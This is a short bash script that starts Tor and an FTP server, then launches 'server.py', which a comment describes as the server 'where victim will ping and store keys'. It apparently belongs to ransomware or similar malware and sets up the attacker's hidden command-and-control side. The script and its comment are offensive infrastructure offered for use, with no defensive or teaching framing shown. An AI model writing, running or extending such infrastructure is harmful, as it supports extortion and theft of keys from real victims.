#!/bin/bash

#Execute tor service
service tor start

#Execute FTP
service vsftpd start

#Server where victim will ping and store keys
python server.py
